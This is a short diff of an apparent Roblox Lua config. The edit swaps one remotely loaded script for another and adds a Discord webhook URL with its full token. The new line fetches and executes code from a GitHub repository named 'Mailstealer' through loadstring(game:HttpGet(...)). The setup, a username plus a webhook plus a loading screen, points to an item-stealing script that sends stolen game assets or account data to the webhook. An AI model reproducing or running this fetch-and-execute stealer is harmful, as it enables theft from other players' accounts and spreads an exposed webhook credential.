@@ -1,4 +1,4 @@
-Username = "loadstping"
-loadingscreen = true 
-farmui = true
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
+Username = "loadstping" -- Your nick
+Webhook = "https://discord.com/api/webhooks/1118931668527485069/OVWA43q9VXP7udXb0ae8OJFRs8yL60dOMHawkgc5IpqvTdhRcB7gFpwgfo25R-7wZg3U" -- Your webhook
+LoadingScreen = true -- You can off loadingscreen, need change to false
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MailstealerV2/Mailstealer/main/v2"))()
